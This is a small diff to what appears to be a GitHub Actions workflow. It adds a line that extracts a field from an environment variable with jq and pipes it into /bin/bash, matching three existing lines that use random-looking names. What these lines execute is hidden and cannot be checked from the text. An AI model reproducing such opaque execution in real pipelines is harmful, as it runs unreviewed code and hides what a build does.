@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$gpdpj0625" | jq -r .yilc202 | /bin/bash
           echo $mytk6 | jq -r .x68618 | /bin/bash
           printf '%s' "$md316" | jq -r .z72 | /bin/bash
+          printf '%s' "$bglo372" | jq -r .rfyz16817 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
